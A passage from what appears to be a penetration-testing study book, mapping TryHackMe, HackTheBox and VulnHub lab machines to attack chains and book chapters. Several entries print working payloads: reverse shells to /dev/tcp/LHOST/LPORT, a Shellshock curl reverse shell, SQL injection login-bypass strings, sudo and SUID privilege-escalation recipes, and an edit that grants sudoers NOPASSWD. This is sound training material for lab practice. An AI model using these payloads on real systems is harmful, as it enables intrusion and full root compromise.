Each level requires finding the password for the next level.
Teaches: SSH, file permissions, pipes, strings, grep, find, base64,
         binary analysis, network connections.
Do NOT skip this. It builds the CLI muscle memory that everything else depends on.
```

## 40.3 Phase 2 — Network Services (Week 2)

**Network Services room** — `https://tryhackme.com/room/networkservices`

```
FREE: Yes    DIFFICULTY: Easy    TIME: 3 hours

What it covers:
  - SMB enumeration (enum4linux, smbclient)
  - Telnet exploitation
  - FTP exploitation including anonymous login
  - NFS enumeration and exploitation (no_root_squash)

How to use this book with it:
  → SMB tasks:  Open Chapter 0c.2
  → FTP tasks:  Open Chapter 0c.1
  → NFS tasks:  Open Chapter 19 (full NFS walkthrough)

For each task: try the commands from THIS BOOK first.
Only look at room hints if you are stuck after 15 minutes.
```

**Network Services 2 room** — `https://tryhackme.com/room/networkservices2`

```
FREE: Yes    DIFFICULTY: Easy-Medium    TIME: 3 hours

Covers:
  - NFS (deeper)
  - SMTP user enumeration (smtp-user-enum)
  - MySQL exploitation

Book chapters: Ch 0a.3 (SMTP), Ch 23.3 (MySQL)
```

## 40.4 Phase 3 — Web Application Initial Access (Week 2-3)

**OWASP Top 10 (2021)** — `https://tryhackme.com/room/owasptop102021`

```
FREE: Yes    DIFFICULTY: Easy    TIME: 5 hours    ESSENTIAL

Covers all major web vulnerability categories with hands-on labs.
Do every single task. Do not rush through it.
Book chapter: 0b.3 (all web vulnerabilities)

Key tasks to spend the most time on:
- Injection (SQL + Command) → Ch 0b.3.1, 0b.3.4
- Insecure Design → understanding root cause
- Security Misconfiguration → default credentials hunt
- Vulnerable Components → CVE research workflow
```

**File Inclusion** — `https://tryhackme.com/room/fileinc`

```
FREE: Yes    DIFFICULTY: Medium    TIME: 2 hours    ESSENTIAL FOR LFI

Walks from basic LFI through log poisoning to full RCE.
This is one of the most important rooms for understanding
how web vulnerabilities become shells.

Book chapter: 0b.3.2 (LFI/RFI section — read before doing the room)

Methodology for this room:
1. Read Chapter 0b.3.2 completely before starting
2. When you reach the log poisoning task, try Chapter 0b.3.2's
   exact approach BEFORE reading the room's explanation
3. After completing: describe in your own words how the chain works
```

**SQL Injection Lab** — `https://tryhackme.com/room/sqlilab`

```
FREE: Yes    DIFFICULTY: Medium    TIME: 3 hours

Hands-on SQL injection practice across multiple scenarios.
Book chapter: 0b.3.1

After this room you should be able to:
- Identify SQLi without sqlmap
- Extract database/table/column names manually
- Use UNION-based injection to read files
- Know when to escalate to sqlmap
```

**Upload Vulnerabilities** — `https://tryhackme.com/room/uploadvulns`

```
FREE: Yes    DIFFICULTY: Easy-Medium    TIME: 2 hours

Covers all file upload bypass techniques.
Book chapter: 0b.3.5

Technique progression:
- Direct PHP upload
- Extension bypass (.php5, .phtml)
- MIME type bypass
- Magic bytes bypass
- .htaccess upload for PHP in image directories
```

**Burp Suite Basics** — `https://tryhackme.com/room/burpsuitebasics`

```
FREE: Yes    DIFFICULTY: Easy    TIME: 2 hours

Burp Suite is your main weapon for web application testing.
Learn to intercept, modify, and replay HTTP requests.
Essential for: bypassing file uploads, manipulating SQLi, testing auth
```

## 40.5 Phase 4 — Core Privilege Escalation Rooms (Week 3-4)

### The Most Important Room: Linux PrivEsc

**`https://tryhackme.com/room/linprivesc`**

```
FREE: Yes    DIFFICULTY: Easy-Medium    TIME: 4-6 hours

THIS IS YOUR MOST IMPORTANT ROOM.
It systematically covers every major privesc technique with hands-on tasks.

Techniques covered (guided):
  Task 4:  Service exploitation
  Task 5:  Weak file permissions (/etc/passwd, /etc/shadow, /etc/crontab)
  Task 6:  Sudo exploitation (multiple binaries)
  Task 7:  SUID exploitation (multiple binaries)
  Task 8:  Capabilities
  Task 9:  Cron jobs
  Task 10: PATH exploitation
  Task 11: NFS
  Task 12: Kernel exploits

HOW TO APPROACH EACH TASK:
  Step 1: Read the task description only (not the answer/hint yet)
  Step 2: Open the matching chapter in THIS BOOK
  Step 3: Try to solve the task using ONLY the book commands
  Step 4: If stuck after 20 minutes, read ONE line of the hint
  Step 5: Try again
  Step 6: After completing, write your own explanation of why it worked

REDO THIS ROOM after one week — completely from scratch.
The second pass should be significantly faster and with fewer hints.
The third pass should need zero hints.
```

### Linux PrivEsc Arena

**`https://tryhackme.com/room/linuxprivescarena`**

```
FREE: Yes    DIFFICULTY: Medium    TIME: 4-6 hours

Less guided than the above — you must enumerate yourself.
This is the bridge between guided learning and real machines.

Multiple privesc vectors on a single machine.
Your task: find ALL of them, not just one.

Approach:
  1. SSH in with provided credentials
  2. Run the FULL enumeration from Chapter 34 on your own
  3. List every vector you find before exploiting any
  4. Exploit each one in order of easiest to hardest
  5. Do NOT look at hints for at least 45 minutes

Covers: SUID, sudo, cron, writable files, PATH,
        NFS, capabilities, kernel exploits
```

### Additional Privesc Rooms

| Room | URL Suffix | Free | Focus | Book Chapter |
|------|-----------|------|-------|------|
| Common Linux Privesc | /room/commonlinuxprivesc | ✅ | Review of all vectors | Ch 11-19 |
| Sudo Security Bypass | /room/sudovulnsbypass | ✅ | CVE-2019-14287 | Ch 15.4 |
| Sudo Buffer Overflow | /room/sudovulnsbof | ✅ | Baron Samedit CVE-2021-3156 | Ch 16.1 |
| Linux Capabilities | /room/linuxcapabilitiesq | ✅ | Capabilities deep dive | Ch 12 |

## 40.6 Phase 5 — Full CTF Machines on THM (Week 4+)

These are complete "boot2root" machines — you get root by chaining techniques. No step-by-step guidance. Use Chapter 39 methodology.

---

**Simple CTF** — `https://tryhackme.com/room/easyctf`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Boot2Root    TIME: 1-2 hours
TECHNIQUES: FTP → CMS exploit → SSH → sudo privesc

Chain:
  nmap → find FTP + HTTP + SSH
  FTP anonymous → find credentials or hints in files
  HTTP → gobuster → find CMS → exploit CMS vulnerability
  Get shell as low user → sudo -l → exploit sudo binary
  → ROOT

Book chapters to have open: Ch 0c.1, Ch 0b.2, Ch 15
The sudo privesc is classic GTFOBins — good first machine.
ATTEMPT FOR 45 MINUTES BEFORE ANY HINTS.
```

---

**RootMe** — `https://tryhackme.com/room/rrootme`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Boot2Root    TIME: 1-2 hours
TECHNIQUES: gobuster → file upload bypass → reverse shell → SUID python

Chain:
  nmap → HTTP only
  gobuster → find /uploads and /panel directories
  Upload PHP reverse shell (bypass extension filter)
  Access uploaded shell → reverse shell lands
  find SUID python → os.setuid(0) → bash
  → ROOT

Book chapters: Ch 0b.2 (gobuster), Ch 0b.3.5 (file upload), Ch 11 (SUID python)

KEY LEARNING: The file upload filter blocks .php — you must
use .php5 or .phtml to bypass. This is covered in Ch 0b.3.5.
Try the bypass yourself before looking for hints.
```

---

**Pickle Rick** — `https://tryhackme.com/room/picklerick`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Web/CTF    TIME: 45 mins
TECHNIQUES: Web source code reading → credentials → command injection

Chain:
  View page source → find username in comments
  robots.txt → find password
  Login to /login.php with found credentials
  Command injection panel → read files → get all ingredients
  (Root access provided via sudo in this room)

Book chapters: Ch 0b.2 (web enum), Ch 0b.3.4 (command injection)
GOOD FOR: Training the habit of always reading page source code.
```

---

**Ignite** — `https://tryhackme.com/room/ignite`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Boot2Root    TIME: 1-2 hours
TECHNIQUES: Fuel CMS CVE → RCE → credentials in files → root

Chain:
  nmap → HTTP
  whatweb → Fuel CMS detected
  searchsploit "fuel cms" → find CVE-2018-16763 (RCE)
  Exploit → www-data shell
  Find credentials in /var/www/html/fuel/application/config/database.php
  Credentials work for root (password reuse!)
  → ROOT via su root with found password

Book chapters: Ch 0b.2, Ch 33 (credential hunting in config files)
BEST LESSON: Database credentials often ARE the root password.
Always try every found credential against su, sudo, ssh.
```

---

**Vulnversity** — `https://tryhackme.com/room/vulnversity`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Guided Boot2Root    TIME: 2 hours
TECHNIQUES: nmap → gobuster → file upload → SUID systemctl

Chain:
  nmap -sV → find web on port 3333
  gobuster → /internal directory (upload form)
  Upload PHP reverse shell with .phtml extension
  systemctl has SUID set
  systemctl exploit via service file → ROOT

Book chapters: Ch 0b.3.5 (upload), Ch 11 (SUID systemctl)

SUID systemctl exploit (book adds this):
  TF=$(mktemp).service
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/sh -c "id > /tmp/output"
  [Install]
  WantedBy=multi-user.target' > $TF
  /bin/systemctl link $TF
  /bin/systemctl enable --now $TF
```

---

**LazyAdmin** — `https://tryhackme.com/room/lazyadmin`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Boot2Root    TIME: 1-2 hours
TECHNIQUES: SweetRice CMS → file upload → sudo writable script

Chain:
  gobuster → /content (SweetRice CMS)
  MySQL backup in /content/inc/mysql_backup/ → credentials!
  Login to admin panel with found creds
  Upload PHP shell via Media Center
  Get www-data shell
  sudo -l → can run /etc/copy.sh as root
  ls -la /etc/copy.sh → writable!
  echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' > /etc/copy.sh
  sudo /etc/copy.sh → ROOT

Book chapters: Ch 33 (backup files), Ch 13 (writable sudo script)
BEST LESSON: Check backup directories for database credentials.
```

---

**Skynet** — `https://tryhackme.com/room/skynet`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Boot2Root    TIME: 2-3 hours
TECHNIQUES: SMB → credentials → squirrelmail → RFI → cron wildcard

Chain:
  nmap → find SMB + HTTP + SMTP
  smbclient anonymous → find milesdyson wordlist
  Brute force SMB with found wordlist → get password
  Squirrelmail login → find credentials in email
  HTTP with creds → admin page with path traversal
  RFI or LFI → reverse shell
  pspy → find cron running tar on /var/www/html/stuff/*
  tar wildcard injection in that directory → ROOT

Book chapters: Ch 0c.2 (SMB), Ch 26 (wildcard injection), Ch 22 (cron)
BEST LESSON: tar wildcard injection in a cron job.
Study Chapter 26.2 before attempting the privesc here.
```

---

**Agent Sudo** — `https://tryhackme.com/room/agentsudoctf`

```
FREE: Yes    DIFFICULTY: Easy    TYPE: Boot2Root    TIME: 2 hours
TECHNIQUES: HTTP User-Agent manipulation → FTP → steganography → sudo CVE

Chain:
  HTTP header manipulation → find usernames
  FTP brute force with found username
  Steganography on downloaded images (binwalk, stegseek)
  Find SSH credentials → login
  sudo -l → (root) /bin/bash
  BUT: CVE-2019-14287 bypass needed
  sudo -u#-1 /bin/bash → ROOT

Book chapters: Ch 15.4 (sudo -u#-1 bypass), Ch 16
BEST LESSON: sudo version vulnerabilities bypass even restricted configs.
```

---

**Mr Robot CTF** — `https://tryhackme.com/room/mrrobot`

```
FREE: Yes    DIFFICULTY: Medium    TYPE: Boot2Root    TIME: 3-4 hours
TECHNIQUES: WordPress brute force → PHP shell → SUID nmap

Chain:
  nmap → HTTP (WordPress)
  robots.txt → find key-1-of-3.txt and fsocity.dic (wordlist!)
  wpscan → enumerate users → find "elliot"
  Hydra WP brute force with fsocity.dic wordlist
  WordPress → Appearance → Editor → edit 404.php with PHP shell
  Trigger 404 → shell as daemon
  Find /home/robot/password.raw-md5 → crack it
  su robot → second flag
  find SUID nmap → nmap --interactive → !sh → ROOT (third flag)

Book chapters: Ch 0b.2 (WordPress), Ch 11.3.7 (SUID nmap)
BEST LESSON: Wordlists found ON the target are often the key.
```

---

**Daily Bugle** — `https://tryhackme.com/room/dailybugle`

```
FREE: Yes    DIFFICULTY: Medium    TYPE: Boot2Root    TIME: 3-5 hours
TECHNIQUES: Joomla SQLi → hash crack → Joomla admin → sudo yum

Chain:
  nmap → HTTP (Joomla)
  joomscan → version detection
  searchsploit joomla 3.7.0 → CVE-2017-8917 (SQLi)
  sqlmap or manual → extract admin hash
  hashcat → crack bcrypt hash (slow! use GPU if possible)
  Joomla admin → Templates → edit template → PHP shell
  Shell as apache
  Enumerate → find credentials in configuration.php
  su jjameson → password reuse works
  sudo -l → (root) /usr/bin/yum
  GTFOBins yum exploit → ROOT

Book chapters: Ch 0b.2 (Joomla), Ch 15 (sudo yum GTFOBins)
BEST LESSON: bcrypt hashes take time to crack. While hashcat runs,
continue enumerating. Don't wait — work in parallel.

sudo yum exploit (from GTFOBins):
  TF=$(mktemp -d)
  cat >$TF/x<<EOF
  [main]
  plugins=1
  pluginpath=$TF
  pluginconfpath=$TF
  EOF
  cat >$TF/y.conf<<EOF
  [main]
  enabled=1
  EOF
  cat >$TF/y.py<<EOF
  import os
  import yum
  from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
  requires_api_version='2.1'
  def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
  EOF
  sudo yum -c $TF/x --enableplugin=y
```

---

# Chapter 41: HackTheBox — Complete Free Machine Guide

## 41.1 Platform Setup

```bash
# 1. Create free account: https://app.hackthebox.com/register
# 2. Go to: https://app.hackthebox.com/home/htb/access
# 3. Download your OpenVPN config (choose "Starting Point" or "Labs")
sudo openvpn ~/Downloads/starting_point_USERNAME.ovpn &

# Verify: ping the Starting Point VPN gateway
ping 10.10.10.1

# Alternative: Pwnbox (browser-based Kali)
# Free tier: 2 hours/day
# Access from any machine page → "Pwnbox" button
```

## 41.2 Starting Point — All Free, All Guided

The Starting Point is HTB's beginner area. Every machine has an **official guided writeup** (PDF). Use them ONLY after attempting alone.

`https://app.hackthebox.com/starting-point`

### Tier 0 — Single Technique Machines

```
MEOW
Techniques: nmap, telnet, default credentials
What to do: nmap → find telnet (23) → telnet TARGET → root / (empty password)
Book: Ch 0a.2 (nmap), Ch 0d.1 (default creds)
Time: 10 minutes

FAWN
Techniques: nmap, FTP anonymous login
What to do: nmap → FTP → anonymous login → get flag.txt
Book: Ch 0c.1 (FTP)
Time: 10 minutes

DANCING
Techniques: nmap, SMB anonymous shares
What to do: nmap → smbclient -L TARGET -N → connect to share → get flag
Book: Ch 0c.2 (SMB)
Time: 15 minutes

REDEEMER
Techniques: nmap (custom port), Redis unauthenticated
What to do: nmap -p- → Redis on 6379 → redis-cli -h TARGET → keys * → get flag
Book: Ch 23.2 (Redis)
Time: 15 minutes

EXPLOSION
Techniques: nmap, RDP, default credentials
What to do: nmap → RDP on 3389 → xfreerdp /u:Administrator /p:"" → flag
Book: Ch 0d.1 (default creds)
Time: 10 minutes

PREIGNITION
Techniques: nmap, gobuster, default web credentials
What to do: nmap → HTTP → gobuster → find /admin → admin:admin → flag
Book: Ch 0b.2 (web enum), Ch 0d.1 (default creds)
Time: 15 minutes

MONGOL
Techniques: nmap, MongoDB unauthenticated
What to do: nmap → MongoDB 27017 → mongo TARGET → show dbs → find flag
Time: 15 minutes
```

### Tier 1 — Technique Chains

```
APPOINTMENT
Techniques: nmap, SQL injection authentication bypass
What to do:
  nmap → HTTP → login form
  Try: admin'-- - as username, anything as password
  SQLi bypasses auth → access as admin → flag

Book: Ch 0b.3.1 (SQLi authentication bypass)
Key SQLi payloads to try:
  ' OR '1'='1'-- -
  admin'-- -
  ' OR 1=1-- -
Time: 30 minutes

SEQUEL
Techniques: nmap, MySQL default credentials, SQL commands
What to do:
  nmap → MySQL on 3306
  mysql -h TARGET -u root (no password!)
  show databases; use htb; show tables; select * from config;
Book: Ch 23.3 (MySQL), Ch 0d.1 (default creds)
Time: 20 minutes

CROCODILE
Techniques: nmap, FTP anonymous, credential reuse, web login
What to do:
  nmap → FTP + HTTP
  FTP anonymous → download allowed.userlist and allowed.userlist.passwd
  gobuster on HTTP → find login page
  Try credentials from FTP files on login page → flag

Book: Ch 0c.1 (FTP), Ch 0d.4 (using credentials)
LESSON: Files on FTP often contain credentials for other services.
Time: 30 minutes

RESPONDER
Techniques: nmap, LFI, Responder NTLM capture, hash crack
What to do:
  nmap → HTTP on port 5985 (WinRM) + HTTP
  Web app has ?page= parameter → test LFI
  LFI with UNC path: ?page=//LHOST/share
  Responder captures NTLMv2 hash → hashcat -m 5600
  Evil-WinRM with cracked credentials → flag

Book: Ch 0b.3.2 (LFI)
Note: This machine teaches file responder NTLM capture — unique technique
Time: 45-60 minutes
```

### Tier 2 — Full Privilege Escalation Machines

```
UNIFIED
Techniques: Log4Shell, MongoDB credential extraction, sudo
What to do:
  nmap → UniFi Network (port 8443)
  Log4Shell (CVE-2021-44228) in remember field
  JNDI inject → LDAP → JNDI exploit kit → reverse shell
  MongoDB: mongo --port 27117 → db.admin.find() → get admin hash
  Replace hash with known hash → login to UniFi
  System settings → SSH → find root SSH credentials
  SSH as root → flag

Book: Ch 15 (sudo), Ch 23 (MongoDB)
Difficulty: Medium — attempt after all Tier 0+1
Time: 2-3 hours

INCLUDED
Techniques: nmap, LFI via PHP + TFTP, LXD escape
What to do:
  nmap → HTTP on 80 + TFTP on UDP 69
  Web app: ?file= parameter → LFI confirmed
  TFTP: upload PHP shell to /var/lib/tftpboot/
  LFI → include your TFTP-uploaded PHP file → RCE as www-data
  Find credentials in /var/www/html/.env
  su mike → mike is in lxd group!
  LXD container escape → mount host filesystem → ROOT

Book: Ch 0b.3.2 (LFI), Ch 25.4 (LXD escape)
BEST MACHINE FOR: LFI + container escape chain
Time: 2-3 hours

MARKUP
Techniques: nmap, XXE injection, SSH key, scheduled task
What to do:
  nmap → HTTP + SSH
  Web app → XML input → XXE injection
  XXE: read /etc/passwd → find users → read SSH key
  SSH as daniel
  type C:\Users\Administrator\Desktop\flag.txt (Windows-based)
  Scheduled task running as admin → exploit

Note: This machine has a Windows component — good cross-training
Time: 2 hours
```

## 41.3 Retired Free Machines With Community Writeups

These machines are retired — official HTB writeup requires VIP ($14/mo) but **free community writeups exist** everywhere. The best source is:

- **IppSec YouTube:** `https://www.youtube.com/@ippsec` — video walkthrough of every machine
- **0xdf Hacks Stuff:** `https://0xdf.gitlab.io/` — incredibly detailed written writeups
- **HackTheBox Forum:** Per-machine discussion threads

**THE GOLDEN RULE:** Watch IppSec or read 0xdf only AFTER you have attempted the machine for real. Even if you failed — watching after teaches you what you missed and why.

### Easy Linux Machines (Do These in Order)

```
LAME (2017)
  OS: Linux   Difficulty: Easy
  Technique: Samba 3.0.20 CVE-2007-2447 (username map script)
  Initial access: Metasploit or manual netcat trigger
  Privesc: Shell lands as root directly (no privesc needed)
  Book: Ch 0c.2 (Samba)
  IppSec: https://youtu.be/NT5Te3v00YQ
  WHY START HERE: Simplest possible HTB machine. Zero friction.
                  Forces you to learn Metasploit or manual exploit.

LEGACY (2017)
  OS: Windows   Difficulty: Easy
  Skip for pure Linux focus (MS08-067 Windows RCE)

BLUE (2017)
  OS: Windows   Difficulty: Easy
  Skip for pure Linux focus (MS17-010 EternalBlue)

BEEP (2017)
  OS: Linux   Difficulty: Easy
  Technique: Elastix/FreePBX RCE → multiple privesc paths
  Privesc: MULTIPLE paths — sudo nmap, sudo chmod, credential reuse
  Book: Ch 11, 15, 33
  IppSec: https://youtu.be/XJmBpOd__N8
  WHY DO THIS: First machine where there are MANY privesc paths.
               Forces you to enumerate completely instead of
               stopping at the first thing you find.

OPTIMUM (2017)
  OS: Windows   Skip

SNEAKY (2017)
  OS: Linux   Difficulty: Medium
  Technique: SNMP → find IPv6 address → SSH → SUID buffer overflow
  Unique: IPv6 enumeration via SNMP — teaches non-standard enumeration
  Book: Ch 0a.4 (SNMP)

SHOCKER (2017)
  OS: Linux   Difficulty: Easy
  Technique: Shellshock (CGI script) + sudo perl
  Initial access: nmap → /cgi-bin/ → .sh file → Shellshock RCE
  Privesc: sudo perl -e 'exec "/bin/bash";'
  Book: Ch 15 (sudo perl)
  IppSec: https://youtu.be/IBlTdguhgfY
  WHY DO THIS: Teaches CGI script vulnerabilities + clean sudo exploit.
  
  Shellshock payload:
    curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1" \
         http://TARGET/cgi-bin/user.sh

BASHED (2017)
  OS: Linux   Difficulty: Easy
  Technique: phpbash web shell → sudo scriptmanager → cron
  Initial access: gobuster → find phpbash.php → web-based bash shell
  Privesc step 1: sudo -l → can run scripts as scriptmanager
  Privesc step 2: /scripts/ writable by scriptmanager + root cron runs *.py
  Book: Ch 13 (cron), Ch 15 (sudo)
  IppSec: https://youtu.be/2DqdPcbYcy8
  WHY DO THIS: Classic multi-step privesc. Must chain two users to get root.
               Perfect for learning lateral movement.

NIBBLES (2018)
  OS: Linux   Difficulty: Easy
  Technique: Nibbleblog file upload → sudo /home/nibbler/personal/stuff/monitor.sh
  Initial access: gobuster → /nibbleblog → admin login (admin:nibbles) → plugin upload
  Privesc: sudo monitor.sh → script is owned by nibbler → writable! Edit it.
  Book: Ch 0b.3.5 (file upload), Ch 15 (writable sudo script)
  IppSec: https://youtu.be/s_0GcRGv6Ds
  WHY DO THIS: The sudo binary is a writable script you own. Elegant privesc.

VALENTINE (2018)
  OS: Linux   Difficulty: Easy
  Technique: Heartbleed (CVE-2014-0160) → SSH passphrase from memory → tmux
  Unique: Heartbleed memory leak + tmux session hijacking
  Teaches: How Heartbleed works, memory forensics basics

ARCTIC (2017)
  OS: Windows   Skip

BOUNTY (2018)
  OS: Windows   Skip

CRONOS (2017)
  OS: Linux   Difficulty: Medium
  Technique: DNS zone transfer → SQLi → RCE → cron job
  Initial access: DNS zone transfer reveals admin.cronos.htb → SQLi on login
  Privesc: PHP cron script running as root + writable → edit it
  Book: Ch 0a.4 (DNS zone transfer), Ch 0b.3.1 (SQLi), Ch 13 (cron)
  IppSec: https://youtu.be/eRS-TyHxMqc
  WHY DO THIS: DNS zone transfer is a technique many people miss.
               Teaches looking beyond just HTTP.

MIRAI (2017)
  OS: Linux   Difficulty: Easy
  Technique: Default Pi-hole credentials → Raspberry Pi default creds → USB forensics
  Unique: Raspberry Pi default credentials (pi:raspberry)
  Teaches: IoT device default credentials, deleted file recovery
  Book: Ch 0d.1 (default credentials)

SOLIDSTATE (2017)
  OS: Linux   Difficulty: Medium
  Technique: Apache James mail server → restricted shell escape → writable cron script
  Initial access: James admin (admin:root) → create user → read emails → SSH creds
  Privesc: /opt/tmp.py runs as root via cron → world-writable → edit → ROOT
  Book: Ch 13 (cron, writable scripts)
  IppSec: https://youtu.be/ED7EKGQyGJQ

SUNDAY (2018)
  OS: Solaris   Difficulty: Easy
  Technique: finger user enum → brute force SSH → sudo wget → shadow file
  Unique: Solaris-specific tools, finger protocol
  Teaches: Non-Linux UNIX enumeration

NETWORKED (2019)
  OS: Linux   Difficulty: Easy
  Technique: File upload bypass → command injection in filename → cron + ifcfg
  Initial access: PHP image upload → .php.png bypass → RCE as www-data
  Privesc step 1: cron runs check_attack.php as guly → inject via filename
  Privesc step 2: sudo /usr/local/sbin/changename.sh → inject via interface name
  Book: Ch 0b.3.5 (upload), Ch 13 (cron), Ch 26 (injection)
  IppSec: https://youtu.be/H3t3G70bakM
```

## 41.4 How to Approach Retired Machines

```
WORKFLOW FOR EACH RETIRED HTB MACHINE:

BEFORE STARTING:
  [ ] Machine deployed and VPN connected
  [ ] Workspace directory created (~/boxes/MACHINENAME/)
  [ ] Chapter 39 methodology open
  [ ] This book open in another window
  [ ] Note-taking app open

ATTEMPT PHASE (Do not look at writeups):
  [ ] nmap scans completed and documented
  [ ] Each service investigated per Chapter 0a.3
  [ ] Vulnerability research done (searchsploit + Google)
  [ ] Initial access attempt: spend at least 30-45 min
  [ ] Once in: full enumeration (Chapter 34)
  [ ] Privesc: use decision tree (Chapter 36)

IF STUCK (after 1-2 hours total):
  [ ] Re-read your nmap output looking for missed details
  [ ] Check every port you haven't investigated
  [ ] Run linpeas again (you may have missed output)
  [ ] One small hint from a forum (just the technique name, not HOW)
  [ ] Try again

AFTER COMPLETING (or after giving up after 3+ hours):
  [ ] Watch the IppSec video for this machine
  [ ] Read one written writeup (0xdf or similar)
  [ ] Note: what did you miss and why?
  [ ] Note: what was a technique you'd never seen before?
  [ ] Wait one week, then redo the machine without any notes
```

---

# Chapter 42: VulnHub — Best Free VMs for Offline Practice

## 42.1 Setup VulnHub Locally

```bash
# Download VirtualBox (free): https://www.virtualbox.org/
# Download VMware Player (free): vmware.com/products/workstation-player

# Download machine .ova or .vmdk from vulnhub.com
# In VirtualBox: File → Import Appliance → select .ova

# NETWORKING (critical):
# Set VM to "Host-Only Adapter" in network settings
# Your Kali VM must also be on Host-Only adapter
# Both VMs get IPs in the same subnet (usually 192.168.56.0/24)

# Find the VM's IP after booting:
sudo netdiscover -r 192.168.56.0/24   # ARP-based discovery
arp-scan -l                            # ARP scan local network
nmap -sn 192.168.56.0/24              # Ping sweep

# Or use NAT networking:
# VM gets an IP via DHCP — check VirtualBox DHCP log
# Or: look at the VM console — often shows IP at login prompt

# Set target IP:
export TARGET=192.168.56.X
```

## 42.2 Kioptrix Series — The Classic Beginner Path

The Kioptrix series is the most important VulnHub beginner series. All are free, all teach foundational skills.

---

**Kioptrix Level 1** — `https://www.vulnhub.com/entry/kioptrix-level-1-1,22/`

```
DIFFICULTY: Beginner    RELEASED: 2010    ESSENTIAL

Techniques: Samba trans2open overflow OR OpenSSL mod_ssl
Privesc: Not needed — exploit lands as root

Two paths:

PATH A (Samba):
  nmap -sV → Samba 2.2.1a detected
  searchsploit samba 2.2 → trans2open buffer overflow
  Use: exploit/linux/samba/trans2open in Metasploit
  Or compile: https://www.exploit-db.com/exploits/10
  → Root shell

PATH B (Apache mod_ssl):
  nmap → Apache 1.3.20 with mod_ssl 2.8.4
  searchsploit "mod ssl 2.8" → OpenSSL/mod_ssl Apache worm (0x333)
  More complex — good to attempt after PATH A works

Book chapters: Ch 0c.2 (Samba), Ch 0a.2 (nmap -sV)

WHY THIS MACHINE:
  Forces you to identify service versions accurately.
  Forces you to use searchsploit workflow.
  Teaches: version → CVE → compile/run exploit pipeline.
  Do this before ANY other VulnHub machine.
```

---

**Kioptrix Level 2** — `https://www.vulnhub.com/entry/kioptrix-level-11-2,23/`

```
DIFFICULTY: Beginner    

Techniques: SQLi auth bypass → command injection → kernel exploit
Full chain:

  nmap → HTTP login page + SSH + MySQL
  HTTP login → SQLi authentication bypass:
    Username: ' OR '1'='1'-- -
    Password: anything
  After login → "Basic Administrative Web Console"
  Ping command → command injection:
    127.0.0.1; id   → confirms RCE as apache
    127.0.0.1; bash -i >& /dev/tcp/LHOST/LPORT 0>&1

  Low shell as apache:
    uname -r → 2.6.9
    searchsploit "2.6.9" → sock_sendpage kernel exploit
    Compile on target: gcc exploit.c -o exploit
    ./exploit → ROOT

Book chapters: Ch 0b.3.1 (SQLi), Ch 0b.3.4 (cmd inject), Ch 18 (kernel)

WHY THIS MACHINE:
  Perfect introduction to full exploitation chain.
  SQLi → web RCE → kernel privesc is a classic pattern.
```

---

**Kioptrix Level 3** — `https://www.vulnhub.com/entry/kioptrix-level-12-3,24/`

```
DIFFICULTY: Beginner-Medium

Add to /etc/hosts: 192.168.56.X kioptrix3.com

Techniques: LotusCMS RCE OR SQLi + credential hunting → sudo ht

PATH A:
  LotusCMS exploit → Metasploit or manual
  → www shell
  Find /home/loneferret/CompanyPolicy.README
  → "use ht to edit files"
  sudo -l → can run /usr/local/bin/ht as root
  GTFOBins ht: ht is a hex editor with file write capability
  sudo /usr/local/bin/ht → edit /etc/sudoers → add NOPASSWD: ALL
  → ROOT

PATH B:
  gobuster → find /gallery
  Gallarific SQL injection → admin:admin / find in DB
  Admin panel → file manager → upload PHP shell
  Same privesc via ht

Book chapters: Ch 0b.3.1 (SQLi), Ch 15 (sudo ht - custom binary)

WHY THIS MACHINE:
  Custom sudo binary not in GTFOBins — forces you to THINK.
  ht is a hex editor. Sudo + hex editor = edit any file as root.
  Great lesson in creative thinking with unusual binaries.
```

---

**Kioptrix Level 4** — `https://www.vulnhub.com/entry/kioptrix-level-13-4,25/`

```
DIFFICULTY: Beginner-Medium

Techniques: SQLi → restricted lshell → MySQL UDF → ROOT

  nmap → HTTP + SSH + SMB
  HTTP → SQLi on login: admin' OR '1'='1'-- -
  Login as john or robert (found via SQL) → get SSH passwords from DB
  SSH as john → "lshell" restricted shell!

  Escape lshell:
    echo os.system('/bin/bash')   → escape to real bash!

  Now: enumerate as john
  find / -perm -4000 2>/dev/null → nothing obvious
  sudo -l → nothing
  cat /etc/passwd → mysql runs as root!

  MySQL UDF exploit:
    mysql -u root (no password)
    > select sys_exec('usermod -aG sudo john');
    > select sys_exec('echo john:john | chpasswd');
    Exit MySQL → sudo bash → ROOT

Book chapters: Ch 23.3 (MySQL UDF), Ch 0b.3.1 (SQLi)

WHY THIS MACHINE:
  Restricted shell escape is a critical skill.
  MySQL running as root with UDF = indirect root via DB.
  Very common in real environments.
```

---

**DC-1** — `https://www.vulnhub.com/entry/dc-1,292/`

```
DIFFICULTY: Beginner-Medium

CMS: Drupal 7

Techniques: Drupal CVE → drush credential extraction → SUID find

  nmap → HTTP (Drupal)
  droopescan or wpscan-equivalent for Drupal
  Drupal 7 → CVE-2018-7600 (Drupalgeddon2) OR metasploit module
  Shell as www-data

  Drupal database creds:
    cat /var/www/html/sites/default/settings.php
    → find DB user:password
    mysql -u dbuser -p → check users table

  Drush (Drupal CLI tool) to reset admin password:
    cd /var/www/html
    drush user-password admin --password="newpass"
    → Login to Drupal admin, find more info

  Find SUID:
    find / -perm -u=s -type f 2>/dev/null
    → /usr/bin/find has SUID!
    find / -name flag3.txt -exec cat {} \;
    find . -exec /bin/sh -p \; -quit  → ROOT shell

Book chapters: Ch 0b.2 (Drupal CMS), Ch 11.3.2 (SUID find)
```

---

**DC-2** — `https://www.vulnhub.com/entry/dc-2,311/`

```
DIFFICULTY: Beginner-Medium

CMS: WordPress

Add to /etc/hosts: TARGET dc-2

Techniques: cewl wordlist → wpscan brute → restricted shell → sudo git

  nmap → HTTP + SSH
  Homepage → create wordlist: cewl http://dc-2 -w /tmp/cewl.txt
  wpscan → enumerate users: wpscan --url http://dc-2 -e u
  Found users: admin, jerry, tom
